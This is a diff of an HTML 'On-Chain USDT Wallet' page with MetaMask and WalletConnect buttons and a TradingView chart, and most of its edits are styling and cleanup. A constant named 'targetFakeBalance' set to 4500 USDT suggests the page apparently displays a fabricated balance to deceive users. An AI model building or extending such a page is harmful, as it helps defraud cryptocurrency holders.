@@ -17,9 +17,7 @@
       padding: 20px;
       text-align: center;
     }
-    h1 {
-      color: #00ffcc;
-    }
+    h1 { color: #00ffcc; }
     button {
       background-color: #1e88e5;
       border: none;
@@ -28,10 +26,9 @@
       font-size: 16px;
       cursor: pointer;
       border-radius: 10px;
-      margin: 10px auto;
+      margin: 10px;
       width: 90%;
       max-width: 400px;
-      display: block;
     }
     #wallet, #import, #usdtBalance, #usdValue, #status {
       margin-top: 20px;
@@ -42,8 +39,10 @@
       font-weight: bold;
       color: #00ffcc;
     }
-    .chart {
+    iframe {
+      border: none;
       width: 100%;
+      max-width: 800px;
       height: 420px;
       margin-top: 30px;
     }
@@ -52,9 +51,8 @@
 <body>
 
   <h1>On-Chain USDT Wallet</h1>
-
-  <button onclick="connectMetaMask()">🔗 Connect MetaMask</button>
-  <button onclick="connectWalletConnect()">🔗 Connect WalletConnect</button>
+  <button onclick="connectMetaMask()">Connect MetaMask</button>
+  <button onclick="connectWalletConnect()">Connect WalletConnect</button>
 
   <div id="wallet"></div>
   <div id="import"></div>
@@ -62,14 +60,8 @@
   <div id="usdValue"></div>
   <div id="status"></div>
 
-  <!-- ✅ Live TradingView BTCUSDT Chart -->
-  <div class="chart">
-    <iframe 
-      src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1h&theme=dark&style=1&toolbarbg=f1f3f6&locale=en&timezone=Etc/UTC" 
-      width="100%" height="100%" frameborder="0" 
-      allowtransparency="true" scrolling="no">
-    </iframe>
-  </div>
+  <!-- ✅ TradingView Chart BTC/USDT -->
+  <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=60&theme=dark&style=1&toolbarbg=f1f3f6" allowtransparency="true" scrolling="no"></iframe>
 
   <script>
     const usdtAbi = [
@@ -89,7 +81,7 @@
       }
     ];
 
-    const usdtAddress = "0x55d398326f99059ff775485246999027b3197955"; // BSC USDT
+    const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
     const targetFakeBalance = 4500 * 1e6;
     let liveUsdtPrice = 1;
 
@@ -103,10 +95,7 @@
 
     async function connectWalletConnect() {
       const provider = new WalletConnectProvider.default({
-        rpc: {
-          56: "https://bsc-dataseed.binance.org/",
-          1: "https://mainnet.infura.io/v3/"
-        },
+        rpc: { 56: "https://bsc-dataseed.binance.org/" },
         chainId: 56
       });
       await provider.enable();
@@ -151,7 +140,6 @@
       }
     }
 
-    // Register PWA Service Worker
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('sw.js').then(() => {
         console.log("✅ PWA Ready");
